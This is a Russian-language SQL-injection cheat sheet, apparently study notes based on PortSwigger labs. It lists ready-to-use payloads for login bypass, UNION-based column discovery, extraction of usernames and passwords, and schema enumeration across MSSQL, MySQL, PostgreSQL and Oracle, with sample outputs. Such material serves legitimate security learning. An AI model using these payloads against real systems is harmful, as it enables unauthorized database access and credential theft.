## 📑 Оглавление
- [Что такое SQL-инъекция?](#что-такое-sql-инъекция-sqli)
- [1. Извлечение скрытых данных (WHERE)](#1-извлечение-скрытых-данных-where)
- [2. Обход аутентификации](#2-обход-аутентификации-login-bypass)
- [3. UNION-атака](#3-union-атака)
  - [3.1 Определение колонок](#31-определение-колонок)
  - [3.2 Поиск строковых столбцов](#32-поиск-столбцов-с-полезным-типом-данных)
  - [3.3 Извлечение данных](#33-извлечение-важных-данных)
  - [3.4 Конкатенация значений](#34-извлечение-нескольких-значений-из-одного-столбца)
- [🔍 Анализ базы данных](#-анализ-базы-данных-при-sql-инъекциях)
  - [Определение версии СУБД](#1-определение-типа-и-версии-базы-данных)
  - [Список таблиц (без Oracle)](#получение-списка-таблиц-кроме-oracle)
  - [Список столбцов (без Oracle)](#получение-списка-столбцов-кроме-oracle)
  - [Особенности Oracle](#анализ-базы-данных-в-oracle)

# SQL-инъекция (SQLi)

SQL-инъекция — это уязвимость веб-безопасности, которая позволяет злоумышленнику вмешиваться в запросы, которые приложение отправляет к своей базе данных.

## Что даёт атакующему?
- Возможность читать конфиденциальные данные (имена пользователей, пароли, личную информацию).
- Возможность изменять или удалять данные.
- В некоторых случаях — выполнять команды на сервере.

## Основная причина
Неправильная фильтрация пользовательского ввода перед подстановкой в SQL-запрос.
<details>
<summary><b>1. Извлечение скрытых данных (WHERE)</b></summary>
- ' OR 1=1--
- ' AND 1=1-- (для слепой)
</details>
<details>
<summary><b>2. Обход аутентификации (Login Bypass)</b></summary>
- admin' --
- ' OR 1=1; --
- SELECT * FROM users WHERE username = 'administrator'--' AND password = ''<br>
Измените username параметр, присвоив ему значение:administrator'--
</details>
<details>
<summary><b>🧩 3. UNION-атака (определение кол-во колонок)</b></summary>
' ORDER BY 1--<br>
' ORDER BY 2--<br>
' ORDER BY 3--<br>
' UNION SELECT NULL--<br>
' UNION SELECT NULL,NULL--<br>
' UNION SELECT NULL,NULL,NULL--<br>

### 3.1 UNION-атака (определение колонок в Oracle)
В Oracle существует встроенная таблица dual, которую можно использовать для этой цели. Таким образом, внедряемые запросы в Oracle должны выглядеть следующим образом:
- ' UNION SELECT NULL FROM DUAL--

### 3.2 UNION-атака (Поиск столбцов с полезным типом данных)
- ' UNION SELECT 'a',NULL,NULL,NULL--<br>
- ' UNION SELECT NULL,'a',NULL,NULL--<br>
- ' UNION SELECT NULL,NULL,'a',NULL--<br>
- ' UNION SELECT NULL,NULL,NULL,'a'--<br>

Если ошибка не возникает, и ответ приложения содержит дополнительное содержимое, включая внедренное строковое значение, то соответствующий столбец подходит для извлечения строковых данных.

### 3.3 UNION-атака (Использование SQL-инъекции и атаки UNION для извлечения важных данных.)
- ' UNION SELECT username, password FROM users--<br>

Для осуществления этой атаки необходимо знать, что существует таблица с именем usersи двумя столбцами с именами usernameи password.
Без этой информации вам пришлось бы угадывать имена таблиц и столбцов.
Все современные базы данных предоставляют способы изучения структуры базы данных и определения того, какие таблицы и столбцы они содержат.

### 3.4 UNION-атака (Извлечение нескольких значений из одного столбца.)
- ' UNION SELECT username || '~' || password FROM users--<br>
В разных базах данных используется разный синтаксис для конкатенации строк. Для получения более подробной информации см. шпаргалку по SQL-инъекциям.<br>
portswigger.net/web-security/sql-injection/cheat-sheet<br>
</details>
<details>
 <summary><b>🔍 4. Анализ базы данных при SQL-инъекциях</b></summary>

Для успешной эксплуатации SQL-инъекций часто необходимо получить информацию о базе данных:
- Тип и версия СУБД
- Имена таблиц
- Имена столбцов

---

### 1. Определение типа и версии базы данных

Можно внедрить запросы, специфичные для конкретной СУБД, и посмотреть, какой из них сработает.

| СУБД | Запрос для получения версии |
|------|----------------------------|
| **Microsoft SQL Server** | `SELECT @@version` |
| **MySQL** | `SELECT @@version` |
| **Oracle** | `SELECT * FROM v$version` |
| **PostgreSQL** | `SELECT version()` |

### Пример через UNION-атаку:
' UNION SELECT @@version--

#### Пример вывода (Microsoft SQL Server):
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)<br>
Mar 18 2018 09:11:49<br>
Copyright (c) Microsoft Corporation<br>
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)<br>

### Получение списка таблиц (кроме Oracle)
Большинство типов баз данных (за исключением Oracle) имеют набор представлений, называемых информационной схемой. Она предоставляет информацию о базе данных.<br>
Запрос для получения списка таблиц:<br>
- SELECT * FROM information_schema.tables

#### Пример результата:
| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
|---------------|--------------|------------|------------|
| MyDatabase    | dbo          | Products   | BASE TABLE |
| MyDatabase    | dbo          | Users      | BASE TABLE |
| MyDatabase    | dbo          | Feedback   | BASE TABLE |

### Готовый payload для UNION-атаки:
' UNION SELECT table_name, NULL FROM information_schema.tables--

### Получение списка столбцов (кроме Oracle)
Используй представление information_schema.columns

### Запрос для получения столбцов конкретной таблицы:
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
#### Пример результата:
| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
|---------------|--------------|------------|-------------|-----------|
| MyDatabase    | dbo          | Users      | UserId      | int       |
| MyDatabase    | dbo          | Users      | Username    | varchar   |
| MyDatabase    | dbo          | Users      | Password    | varchar   |
#### Готовый payload для UNION-атаки:
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'Users'--

### Анализ базы данных в Oracle
В Oracle нет information_schema. Используй другие представления:<br>

| Что узнать | Запрос |
| :--- | :--- |
| Список таблиц | `SELECT * FROM all_tables` |
| Столбцы таблицы | `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'` |
### Готовые payload'ы для Oracle:
- ' UNION SELECT table_name, NULL FROM all_tables--<br>
- ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--<br>
### Важно: В Oracle все имена таблиц и столбцов хранятся в верхнем регистре!
</details>
